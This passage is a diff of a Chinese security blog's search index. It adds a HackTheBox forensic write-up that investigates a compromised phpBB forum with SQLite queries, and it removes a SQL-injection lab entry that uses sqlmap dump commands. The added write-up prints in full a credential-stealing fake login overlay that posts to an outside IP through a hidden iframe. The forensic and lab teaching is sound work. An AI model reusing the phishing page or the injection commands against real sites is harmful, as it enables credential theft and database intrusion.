-<h1 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h1><p><strong>论坛里有LDAP连接的明文凭据，密码是多少？</strong></p>
-<p>查询一下<code>phpbb_config</code>配置文件里的内容</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from phpbb_config;</span><br></pre></td></tr></table></figure>
-
-<p>找到LDAP的密码<code>Passw0rd1</code></p>
-<p><img src="/article/Bumblebee-HackTheBox/image-20240419103322104.png"></p>
-<h1 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h1><p><strong>管理员用户的用户代理是什么？</strong></p>
-<p>在数据库的 <code>phpbb_log</code> 表中，寻找 <code>operation</code> 为 <code>LOG_ADMIN_AUTH_SUCCESS</code> 的记录，可以找到这两条 ip</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10.255.254.2</span><br><span class="line">10.10.0.78</span><br></pre></td></tr></table></figure>
-
-<p>前面已经确定承包商的 ip 为 <code>10.10.0.78</code>，那么 <code>10.255.254.2</code> 就是管理员用户的 ip，在 <code>access.log</code> 中可以找到 <code>user-agent</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat access.log | grep &quot;10.255.254.2&quot;</span><br></pre></td></tr></table></figure>
-
-<h1 id="Task8"><a href="#Task8" class="headerlink" title="Task8"></a>Task8</h1><p><strong>承包商什么时候将自己添加到管理员组？ （世界标准时间）</strong></p>
-<p><code>phpbb_log</code>中有显示添加admin的时间戳，直接用前面脚本转换就行</p>
-<h1 id="Task9"><a href="#Task9" class="headerlink" title="Task9"></a>Task9</h1><p><strong>承包商何时下载了数据库备份？</strong></p>
-<p>在<code>access.log</code>筛选<code>backup</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat access.log | grep &quot;backup&quot;</span><br></pre></td></tr></table></figure>
-
-<p>成功找到，不过要转换一下时区为<code>26/04/2023 11:01:38</code></p>
-<p><img src="/article/Bumblebee-HackTheBox/image-20240419104642901.png"></p>
-<h1 id="Task10"><a href="#Task10" class="headerlink" title="Task10"></a>Task10</h1><p><strong>access.log 中所述的数据库备份的大小（以字节为单位）是多少？</strong></p>
-<p>直接看响应包就行了，大小为34707</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10.10.0.78 - - [26/Apr/2023:12:01:38 +0100] &quot;GET /store/backup_1682506471_dcsr71p7fyijoyq8.sql.gz HTTP/1.1&quot; 200 34707 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>日志分析</category>
-      </categories>
-      <tags>
-        <tag>HackTheBox</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2018信息安全铁人三项数据赛</title>
     <url>/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B.html</url>
     <content><![CDATA[<p>记录一些铁三的流量分析题</p>
@@ -182,29 +100,6 @@
       </tags>
   </entry>
   <entry>
-    <title>CVE-2022-28512</title>
-    <url>/article/CVE-2022-28512.html</url>
-    <content><![CDATA[<p>Fantastic Blog (CMS)是一个博客&#x2F;文章网络内容管理系统。该CMS的&#x2F;single.php路径下，id参数存在一个SQL注入漏洞</p>
-<span id="more"></span>
-
-<h1 id="CVE-2022-28512"><a href="#CVE-2022-28512" class="headerlink" title="CVE-2022-28512"></a>CVE-2022-28512</h1><p>打开题目</p>
-<p><img src="/article/CVE-2022-28512/image-20240413231746967.png"></p>
-<p>按照漏洞描述在<code>/single.php</code>路径的参数id存在sql注入漏洞，我们手动注入一下</p>
-<p><img src="/article/CVE-2022-28512/image-20240413231855630.png"></p>
-<p>可以发现测试成功，我们bp抓包并保存下来，然后使用sqlmap</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -l &quot;./requests/1.txt&quot;</span><br></pre></td></tr></table></figure>
-
-<p>得到flag</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -l &quot;./requests/1.txt&quot; -D ctf -T flag -C flag --dump</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/CVE-2022-28512/image-20240413232423326.png"></p>
-]]></content>
-      <categories>
-        <category>春秋云镜</category>
-        <category>漏洞复现</category>
-      </categories>
-  </entry>
-  <entry>
     <title>Brutus-HackTheBox</title>
     <url>/article/Brutus-HackTheBox.html</url>
     <content><![CDATA[<p>wtmp日志文件</p>
@@ -260,33 +155,104 @@
       </tags>
   </entry>
   <entry>
-    <title>IClean-HackTheBox</title>
-    <url>/article/IClean-HackTheBox.html</url>
-    <content><![CDATA[<h1 id="IClean-HackTheBox"><a href="#IClean-HackTheBox" class="headerlink" title="IClean-HackTheBox"></a>IClean-HackTheBox</h1><p><strong>信息搜集</strong></p>
+    <title>Bumblebee-HackTheBox</title>
+    <url>/article/Bumblebee-HackTheBox.html</url>
+    <content><![CDATA[<p>对sqlite3数据库文件进行日志分析</p>
+<span id="more"></span>
+
+<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><blockquote>
+<p>外部承包商通过访客 Wi-Fi 访问了 Forela 的内部论坛，他们似乎窃取了管理用户的凭据！我们附上了论坛的一些日志和 sqlite3 格式的完整数据库转储，以帮助您进行调查。</p>
+</blockquote>
+<h1 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h1><p><strong>外部承包商的用户名是什么？</strong></p>
+<p>解压文件得到log日志和sqlite3数据库文件</p>
+<p><img src="/article/Bumblebee-HackTheBox/image-20240419095217173.png"></p>
+<p>使用sqlite打开</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlite incident.sqlite3</span><br></pre></td></tr></table></figure>
+
+<p>然后<code>.tables</code>查看所有表找到<code>phpbb_users</code>，那么我们查看下字段</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma table_info(phpbb_users);</span><br></pre></td></tr></table></figure>
+
+<p>发现有<code>username</code>和<code>user_password</code></p>
+<p><img src="/article/Bumblebee-HackTheBox/image-20240419095103867.png"></p>
+<p>直接查询</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select username,user_password from phpbb_users;</span><br></pre></td></tr></table></figure>
+
+<p>注意到最下面的<code>apoole1</code></p>
+<p><img src="/article/Bumblebee-HackTheBox/image-20240419095434129.png"></p>
+<h1 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h1><p><strong>承包商使用什么 IP 地址创建帐户？</strong></p>
+<p>刚刚查看表的字段里有<code>user_ip</code>，查询得到ip为<code>10.10.0.78</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select user_ip from phpbb_users where username=&quot;apoole1&quot;;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h1><p><strong>承包商发布的恶意帖子的 post_id 是什么？</strong></p>
+<p>我们找到<code>phpbb_posts</code>，然后查询一下</p>
+<p><img src="/article/Bumblebee-HackTheBox/image-20240419100317816.png"></p>
+<p>很明显id为9的内容很多</p>
+<h1 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h1><p><strong>凭据窃取者将其数据发送到的完整 URI 是什么？</strong></p>
+<p>我们将前一问的表单内容下载下来</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select post_text from phpbb_posts where post_id=9;</span><br></pre></td></tr></table></figure>
+
+<p>内容如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123; z-index: 100;&#125;.modal &#123; position:fixed; top:0; left:0; height:100%;</span><br><span class="line">        width:100%; z-index:101; background-color:white; opacity:1;&#125;.modal.hidden</span><br><span class="line">        &#123; visibility: hidden;&#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">        function sethidden() &#123;</span><br><span class="line">            const d = new Date();</span><br><span class="line">            d.setTime(d.getTime() + (24 * 60 * 60 * 1000));</span><br><span class="line">            let expires = &quot;expires=&quot; + d.toUTCString();</span><br><span class="line">            document.cookie = &quot;phpbb_token=1;&quot; + expires + &quot;;&quot;;</span><br><span class="line">            var modal = document.getElementById(&#x27;zbzbz1234&#x27;);</span><br><span class="line">            modal.classList.add(&quot;hidden&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        document.addEventListener(&quot;DOMContentLoaded&quot;,</span><br><span class="line">        function(event) &#123;</span><br><span class="line">            let cookieexists = false;</span><br><span class="line">            let name = &quot;phpbb_token=&quot;;</span><br><span class="line">            let cookies = decodeURIComponent(document.cookie);</span><br><span class="line">            let ca = cookies.split(&#x27;;&#x27;);</span><br><span class="line">            for (let i = 0; i &lt; ca.length; i++) &#123;</span><br><span class="line">                let c = ca[i];</span><br><span class="line">                while (c.charAt(0) == &#x27; &#x27;) &#123;</span><br><span class="line">                    c = c.substring(1);</span><br><span class="line">                &#125;</span><br><span class="line">                if (c.indexOf(name) == 0) &#123;</span><br><span class="line">                    cookieexists = true;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            if (cookieexists) &#123;</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">            var modal = document.getElementById(&#x27;zbzbz1234&#x27;);</span><br><span class="line">            modal.classList.remove(&quot;hidden&quot;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;iframe name=&quot;hiddenframe&quot; id=&quot;hiddenframe&quot; style=&quot;display:none&quot;&gt;</span><br><span class="line">    &lt;/iframe&gt;</span><br><span class="line">    &lt;div class=&quot;modal hidden&quot; id=&quot;zbzbz1234&quot; onload=&quot;shouldshow&quot;&gt;</span><br><span class="line">        &lt;div id=&quot;wrap&quot; class=&quot;wrap&quot;&gt;</span><br><span class="line">            &lt;a id=&quot;top&quot; class=&quot;top-anchor&quot; accesskey=&quot;t&quot;&gt;</span><br><span class="line">            &lt;/a&gt;</span><br><span class="line">            &lt;div id=&quot;page-header&quot;&gt;</span><br><span class="line">                &lt;div class=&quot;headerbar&quot; role=&quot;banner&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;inner&quot;&gt;</span><br><span class="line">                        &lt;div id=&quot;site-description&quot; class=&quot;site-description&quot;&gt;</span><br><span class="line">                            &lt;a id=&quot;logo&quot; class=&quot;logo&quot; href=&quot;./index.php&quot; title=&quot;Board index&quot;&gt;</span><br><span class="line">                                &lt;span class=&quot;site_logo&quot;&gt;</span><br><span class="line">                                &lt;/span&gt;</span><br><span class="line">                            &lt;/a&gt;</span><br><span class="line">                            &lt;h1&gt;</span><br><span class="line">                                forum.forela.co.uk</span><br><span class="line">                            &lt;/h1&gt;</span><br><span class="line">                            &lt;p&gt;</span><br><span class="line">                                Forela internal forum</span><br><span class="line">                            &lt;/p&gt;</span><br><span class="line">                            &lt;p class=&quot;skiplink&quot;&gt;</span><br><span class="line">                                &lt;a href=&quot;#start_here&quot;&gt;</span><br><span class="line">                                    Skip to content</span><br><span class="line">                                &lt;/a&gt;</span><br><span class="line">                            &lt;/p&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;div id=&quot;search-box&quot; class=&quot;search-box search-header&quot; role=&quot;search&quot;&gt;</span><br><span class="line">                            &lt;form action=&quot;./search.php&quot; method=&quot;get&quot; id=&quot;search1&quot;&gt;</span><br><span class="line">                                &lt;fieldset&gt;</span><br><span class="line">                                    &lt;input name=&quot;keywords&quot; id=&quot;keywords1&quot; type=&quot;search&quot; maxlength=&quot;128&quot; title=&quot;Search for keywords&quot;</span><br><span class="line">                                    class=&quot;inputbox search tiny&quot; size=&quot;20&quot; value=&quot;&quot; placeholder=&quot;Search…&quot;&gt;</span><br><span class="line">                                    &lt;button class=&quot;button button-search&quot; type=&quot;submit&quot; title=&quot;Search&quot;&gt;</span><br><span class="line">                                        &lt;i class=&quot;icon fa-search fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                        &lt;/i&gt;</span><br><span class="line">                                        &lt;span class=&quot;sr-only&quot;&gt;</span><br><span class="line">                                            Search</span><br><span class="line">                                        &lt;/span&gt;</span><br><span class="line">                                    &lt;/button&gt;</span><br><span class="line">                                    &lt;a href=&quot;./search.php&quot; class=&quot;button button-search-end&quot; title=&quot;Advanced search&quot;&gt;</span><br><span class="line">                                        &lt;i class=&quot;icon fa-cog fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                        &lt;/i&gt;</span><br><span class="line">                                        &lt;span class=&quot;sr-only&quot;&gt;</span><br><span class="line">                                            Advanced search</span><br><span class="line">                                        &lt;/span&gt;</span><br><span class="line">                                    &lt;/a&gt;</span><br><span class="line">                                &lt;/fieldset&gt;</span><br><span class="line">                            &lt;/form&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class=&quot;navbar&quot; role=&quot;navigation&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;inner&quot;&gt;</span><br><span class="line">                        &lt;ul id=&quot;nav-main&quot; class=&quot;nav-main linklist&quot; role=&quot;menubar&quot;&gt;</span><br><span class="line">                            &lt;li id=&quot;quick-links&quot; class=&quot;quick-links dropdown-container responsive-menu&quot;</span><br><span class="line">                            data-skip-responsive=&quot;true&quot;&gt;</span><br><span class="line">                                &lt;a href=&quot;#&quot; class=&quot;dropdown-trigger dropdown-toggle&quot;&gt;</span><br><span class="line">                                    &lt;i class=&quot;icon fa-bars fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                    &lt;/i&gt;</span><br><span class="line">                                    &lt;span&gt;</span><br><span class="line">                                        Quick links</span><br><span class="line">                                    &lt;/span&gt;</span><br><span class="line">                                &lt;/a&gt;</span><br><span class="line">                                &lt;div class=&quot;dropdown&quot;&gt;</span><br><span class="line">                                    &lt;div class=&quot;pointer&quot;&gt;</span><br><span class="line">                                        &lt;div class=&quot;pointer-inner&quot;&gt;</span><br><span class="line">                                        &lt;/div&gt;</span><br><span class="line">                                    &lt;/div&gt;</span><br><span class="line">                                    &lt;ul class=&quot;dropdown-contents&quot; role=&quot;menu&quot;&gt;</span><br><span class="line">                                        &lt;li class=&quot;separator&quot;&gt;</span><br><span class="line">                                        &lt;/li&gt;</span><br><span class="line">                                        &lt;li&gt;</span><br><span class="line">                                            &lt;a href=&quot;./search.php?search_id=unanswered&quot; role=&quot;menuitem&quot;&gt;</span><br><span class="line">                                                &lt;i class=&quot;icon fa-file-o fa-fw icon-gray&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                                &lt;/i&gt;</span><br><span class="line">                                                &lt;span&gt;</span><br><span class="line">                                                    Unanswered topics</span><br><span class="line">                                                &lt;/span&gt;</span><br><span class="line">                                            &lt;/a&gt;</span><br><span class="line">                                        &lt;/li&gt;</span><br><span class="line">                                        &lt;li&gt;</span><br><span class="line">                                            &lt;a href=&quot;./search.php?search_id=active_topics&quot; role=&quot;menuitem&quot;&gt;</span><br><span class="line">                                                &lt;i class=&quot;icon fa-file-o fa-fw icon-blue&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                                &lt;/i&gt;</span><br><span class="line">                                                &lt;span&gt;</span><br><span class="line">                                                    Active topics</span><br><span class="line">                                                &lt;/span&gt;</span><br><span class="line">                                            &lt;/a&gt;</span><br><span class="line">                                        &lt;/li&gt;</span><br><span class="line">                                        &lt;li class=&quot;separator&quot;&gt;</span><br><span class="line">                                        &lt;/li&gt;</span><br><span class="line">                                        &lt;li&gt;</span><br><span class="line">                                            &lt;a href=&quot;./search.php&quot; role=&quot;menuitem&quot;&gt;</span><br><span class="line">                                                &lt;i class=&quot;icon fa-search fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                                &lt;/i&gt;</span><br><span class="line">                                                &lt;span&gt;</span><br><span class="line">                                                    Search</span><br><span class="line">                                                &lt;/span&gt;</span><br><span class="line">                                            &lt;/a&gt;</span><br><span class="line">                                        &lt;/li&gt;</span><br><span class="line">                                        &lt;li class=&quot;separator&quot;&gt;</span><br><span class="line">                                        &lt;/li&gt;</span><br><span class="line">                                    &lt;/ul&gt;</span><br><span class="line">                                &lt;/div&gt;</span><br><span class="line">                            &lt;/li&gt;</span><br><span class="line">                            &lt;li data-skip-responsive=&quot;true&quot;&gt;</span><br><span class="line">                                &lt;a href=&quot;/phpBB3/app.php/help/faq&quot; rel=&quot;help&quot; title=&quot;Frequently Asked Questions&quot;</span><br><span class="line">                                role=&quot;menuitem&quot;&gt;</span><br><span class="line">                                    &lt;i class=&quot;icon fa-question-circle fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                    &lt;/i&gt;</span><br><span class="line">                                    &lt;span&gt;</span><br><span class="line">                                        FAQ</span><br><span class="line">                                    &lt;/span&gt;</span><br><span class="line">                                &lt;/a&gt;</span><br><span class="line">                                &lt;li class=&quot;rightside&quot; data-skip-responsive=&quot;true&quot;&gt;</span><br><span class="line">                                    &lt;a href=&quot;./ucp.php?mode=login&quot; title=&quot;Login&quot; accesskey=&quot;x&quot; role=&quot;menuitem&quot;&gt;</span><br><span class="line">                                        &lt;i class=&quot;icon fa-power-off fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                        &lt;/i&gt;</span><br><span class="line">                                        &lt;span&gt;</span><br><span class="line">                                            Login</span><br><span class="line">                                        &lt;/span&gt;</span><br><span class="line">                                    &lt;/a&gt;</span><br><span class="line">                                &lt;/li&gt;</span><br><span class="line">                                &lt;li class=&quot;rightside&quot; data-skip-responsive=&quot;true&quot;&gt;</span><br><span class="line">                                    &lt;a href=&quot;./ucp.php?mode=register&quot; role=&quot;menuitem&quot;&gt;</span><br><span class="line">                                        &lt;i class=&quot;icon fa-pencil-square-o  fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                        &lt;/i&gt;</span><br><span class="line">                                        &lt;span&gt;</span><br><span class="line">                                            Register</span><br><span class="line">                                        &lt;/span&gt;</span><br><span class="line">                                    &lt;/a&gt;</span><br><span class="line">                                &lt;/li&gt;</span><br><span class="line">                            &lt;/li data-skip-responsive=&quot;true&quot;&gt;</span><br><span class="line">                        &lt;/ul&gt;</span><br><span class="line">                        &lt;ul id=&quot;nav-breadcrumbs&quot; class=&quot;nav-breadcrumbs linklist navlinks&quot; role=&quot;menubar&quot;&gt;</span><br><span class="line">                            &lt;li class=&quot;breadcrumbs&quot; itemscope=&quot;&quot; itemtype=&quot;http://schema.org/BreadcrumbList&quot;</span><br><span class="line">                            style=&quot;max-width: 936px;&quot;&gt;</span><br><span class="line">                                &lt;span class=&quot;crumb&quot; itemtype=&quot;http://schema.org/ListItem&quot; itemprop=&quot;itemListElement&quot;</span><br><span class="line">                                itemscope=&quot;&quot;&gt;</span><br><span class="line">                                    &lt;a href=&quot;./index.php&quot; itemtype=&quot;https://schema.org/Thing&quot; itemprop=&quot;item&quot;</span><br><span class="line">                                    accesskey=&quot;h&quot; data-navbar-reference=&quot;index&quot; title=&quot;Board index&quot;&gt;</span><br><span class="line">                                        &lt;i class=&quot;icon fa-home fa-fw&quot;&gt;</span><br><span class="line">                                        &lt;/i&gt;</span><br><span class="line">                                        &lt;span itemprop=&quot;name&quot;&gt;</span><br><span class="line">                                            Board index</span><br><span class="line">                                        &lt;/span&gt;</span><br><span class="line">                                    &lt;/a&gt;</span><br><span class="line">                                    &lt;meta itemprop=&quot;position&quot; content=&quot;1&quot;&gt;</span><br><span class="line">                                &lt;/span&gt;</span><br><span class="line">                            &lt;/li&gt;</span><br><span class="line">                            &lt;li class=&quot;rightside responsive-search&quot;&gt;</span><br><span class="line">                                &lt;a href=&quot;./search.php&quot; title=&quot;View the advanced search options&quot; role=&quot;menuitem&quot;&gt;</span><br><span class="line">                                    &lt;i class=&quot;icon fa-search fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                    &lt;/i&gt;</span><br><span class="line">                                    &lt;span class=&quot;sr-only&quot;&gt;</span><br><span class="line">                                        Search</span><br><span class="line">                                    &lt;/span&gt;</span><br><span class="line">                                &lt;/a&gt;</span><br><span class="line">                            &lt;/li&gt;</span><br><span class="line">                        &lt;/ul&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;a id=&quot;start_here&quot; class=&quot;anchor&quot;&gt;</span><br><span class="line">            &lt;/a&gt;</span><br><span class="line">            &lt;div id=&quot;page-body&quot; class=&quot;page-body&quot; role=&quot;main&quot;&gt;</span><br><span class="line">                &lt;div class=&quot;panel&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;inner&quot;&gt;</span><br><span class="line">                        &lt;div class=&quot;content&quot;&gt;</span><br><span class="line">                            &lt;h3&gt;</span><br><span class="line">                                Session Timeout</span><br><span class="line">                            &lt;/h3&gt;</span><br><span class="line">                            &lt;br/&gt;</span><br><span class="line">                            &lt;br/&gt;</span><br><span class="line">                            &lt;p&gt;</span><br><span class="line">                                Your session token has timed out in order to proceed you must login again.</span><br><span class="line">                            &lt;/p&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;form action=&quot;http://10.10.0.78/update.php&quot; method=&quot;post&quot; id=&quot;login&quot; data-focus=&quot;username&quot;</span><br><span class="line">                target=&quot;hiddenframe&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;panel&quot;&gt;</span><br><span class="line">                        &lt;div class=&quot;inner&quot;&gt;</span><br><span class="line">                            &lt;div class=&quot;content&quot;&gt;</span><br><span class="line">                                &lt;h2 class=&quot;login-title&quot;&gt;</span><br><span class="line">                                    Login</span><br><span class="line">                                &lt;/h2&gt;</span><br><span class="line">                                &lt;fieldset class=&quot;fields1&quot;&gt;</span><br><span class="line">                                    &lt;dl&gt;</span><br><span class="line">                                        &lt;dt&gt;</span><br><span class="line">                                            &lt;label for=&quot;username&quot;&gt;</span><br><span class="line">                                                Username:</span><br><span class="line">                                            &lt;/label&gt;</span><br><span class="line">                                        &lt;/dt&gt;</span><br><span class="line">                                        &lt;dd&gt;</span><br><span class="line">                                            &lt;input type=&quot;text&quot; tabindex=&quot;1&quot; name=&quot;username&quot; id=&quot;username&quot; size=&quot;25&quot;</span><br><span class="line">                                            value=&quot;&quot; class=&quot;inputbox autowidth&quot;&gt;</span><br><span class="line">                                        &lt;/dd&gt;</span><br><span class="line">                                    &lt;/dl&gt;</span><br><span class="line">                                    &lt;dl&gt;</span><br><span class="line">                                        &lt;dt&gt;</span><br><span class="line">                                            &lt;label for=&quot;password&quot;&gt;</span><br><span class="line">                                                Password:</span><br><span class="line">                                            &lt;/label&gt;</span><br><span class="line">                                        &lt;/dt&gt;</span><br><span class="line">                                        &lt;dd&gt;</span><br><span class="line">                                            &lt;input type=&quot;password&quot; tabindex=&quot;2&quot; id=&quot;password&quot; name=&quot;password&quot; size=&quot;25&quot;</span><br><span class="line">                                            class=&quot;inputbox autowidth&quot; autocomplete=&quot;off&quot;&gt;</span><br><span class="line">                                        &lt;/dd&gt;</span><br><span class="line">                                    &lt;/dl&gt;</span><br><span class="line">                                    &lt;dl&gt;</span><br><span class="line">                                        &lt;dd&gt;</span><br><span class="line">                                            &lt;label for=&quot;autologin&quot;&gt;</span><br><span class="line">                                                &lt;input type=&quot;checkbox&quot; name=&quot;autologin&quot; id=&quot;autologin&quot; tabindex=&quot;4&quot;&gt;</span><br><span class="line">                                                Remember me</span><br><span class="line">                                            &lt;/label&gt;</span><br><span class="line">                                        &lt;/dd&gt;</span><br><span class="line">                                        &lt;dd&gt;</span><br><span class="line">                                            &lt;label for=&quot;viewonline&quot;&gt;</span><br><span class="line">                                                &lt;input type=&quot;checkbox&quot; name=&quot;viewonline&quot; id=&quot;viewonline&quot; tabindex=&quot;5&quot;&gt;</span><br><span class="line">                                                Hide my online status this session</span><br><span class="line">                                            &lt;/label&gt;</span><br><span class="line">                                        &lt;/dd&gt;</span><br><span class="line">                                    &lt;/dl&gt;</span><br><span class="line">                                    &lt;dl&gt;</span><br><span class="line">                                        &lt;dt&gt;</span><br><span class="line">                                            &amp;nbsp;</span><br><span class="line">                                        &lt;/dt&gt;</span><br><span class="line">                                        &lt;dd&gt;</span><br><span class="line">                                            &lt;input type=&quot;submit&quot; name=&quot;login&quot; tabindex=&quot;6&quot; value=&quot;Login&quot; class=&quot;button1&quot;</span><br><span class="line">                                            onclick=&quot;sethidden()&quot;&gt;</span><br><span class="line">                                        &lt;/dd&gt;</span><br><span class="line">                                    &lt;/dl&gt;</span><br><span class="line">                                &lt;/fieldset class=&quot;fields1&quot;&gt;</span><br><span class="line">                            &lt;/div&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/form&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div id=&quot;page-footer&quot; class=&quot;page-footer&quot; role=&quot;contentinfo&quot;&gt;</span><br><span class="line">                &lt;div class=&quot;navbar&quot; role=&quot;navigation&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;inner&quot;&gt;</span><br><span class="line">                        &lt;ul id=&quot;nav-footer&quot; class=&quot;nav-footer linklist&quot; role=&quot;menubar&quot;&gt;</span><br><span class="line">                            &lt;li class=&quot;breadcrumbs&quot;&gt;</span><br><span class="line">                                &lt;span class=&quot;crumb&quot;&gt;</span><br><span class="line">                                    &lt;a href=&quot;./index.php&quot; data-navbar-reference=&quot;index&quot; title=&quot;Board index&quot;&gt;</span><br><span class="line">                                        &lt;i class=&quot;icon fa-home fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                        &lt;/i&gt;</span><br><span class="line">                                        &lt;span&gt;</span><br><span class="line">                                            Board index</span><br><span class="line">                                        &lt;/span&gt;</span><br><span class="line">                                    &lt;/a&gt;</span><br><span class="line">                                &lt;/span&gt;</span><br><span class="line">                            &lt;/li&gt;</span><br><span class="line">                            &lt;li class=&quot;responsive-menu hidden rightside dropdown-container&quot;&gt;</span><br><span class="line">                                &lt;a href=&quot;javascript:void(0);&quot; class=&quot;js-responsive-menu-link responsive-menu-link dropdown-toggle&quot;&gt;</span><br><span class="line">                                    &lt;i class=&quot;icon fa-bars fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                    &lt;/i&gt;</span><br><span class="line">                                &lt;/a&gt;</span><br><span class="line">                                &lt;div class=&quot;dropdown&quot;&gt;</span><br><span class="line">                                    &lt;div class=&quot;pointer&quot;&gt;</span><br><span class="line">                                        &lt;div class=&quot;pointer-inner&quot;&gt;</span><br><span class="line">                                        &lt;/div&gt;</span><br><span class="line">                                    &lt;/div&gt;</span><br><span class="line">                                    &lt;ul class=&quot;dropdown-contents&quot;&gt;</span><br><span class="line">                                    &lt;/ul&gt;</span><br><span class="line">                                &lt;/div&gt;</span><br><span class="line">                            &lt;/li&gt;</span><br><span class="line">                            &lt;li class=&quot;rightside&quot;&gt;</span><br><span class="line">                                All times are</span><br><span class="line">                                &lt;span title=&quot;UTC&quot;&gt;</span><br><span class="line">                                    UTC</span><br><span class="line">                                &lt;/span&gt;</span><br><span class="line">                            &lt;/li&gt;</span><br><span class="line">                            &lt;li class=&quot;rightside&quot;&gt;</span><br><span class="line">                                &lt;a href=&quot;./ucp.php?mode=delete_cookies&quot; data-ajax=&quot;true&quot; data-refresh=&quot;true&quot;</span><br><span class="line">                                role=&quot;menuitem&quot;&gt;</span><br><span class="line">                                    &lt;i class=&quot;icon fa-trash fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                    &lt;/i&gt;</span><br><span class="line">                                    &lt;span&gt;</span><br><span class="line">                                        Delete cookies</span><br><span class="line">                                    &lt;/span&gt;</span><br><span class="line">                                &lt;/a&gt;</span><br><span class="line">                            &lt;/li&gt;</span><br><span class="line">                        &lt;/ul&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class=&quot;copyright&quot;&gt;</span><br><span class="line">                    &lt;p class=&quot;footer-row&quot;&gt;</span><br><span class="line">                        &lt;span class=&quot;footer-copyright&quot;&gt;</span><br><span class="line">                            Powered by</span><br><span class="line">                            &lt;a href=&quot;https://www.phpbb.com/&quot;&gt;</span><br><span class="line">                                phpBB</span><br><span class="line">                            &lt;/a&gt;</span><br><span class="line">                            ® Forum Software © phpBB Limited</span><br><span class="line">                        &lt;/span&gt;</span><br><span class="line">                    &lt;/p&gt;</span><br><span class="line">                    &lt;p class=&quot;footer-row&quot;&gt;</span><br><span class="line">                        &lt;a class=&quot;footer-link&quot; href=&quot;./ucp.php?mode=privacy&quot; title=&quot;Privacy&quot; role=&quot;menuitem&quot;&gt;</span><br><span class="line">                            &lt;span class=&quot;footer-link-text&quot;&gt;</span><br><span class="line">                                Privacy</span><br><span class="line">                            &lt;/span&gt;</span><br><span class="line">                        &lt;/a&gt;</span><br><span class="line">                        |</span><br><span class="line">                        &lt;a class=&quot;footer-link&quot; href=&quot;./ucp.php?mode=terms&quot; title=&quot;Terms&quot; 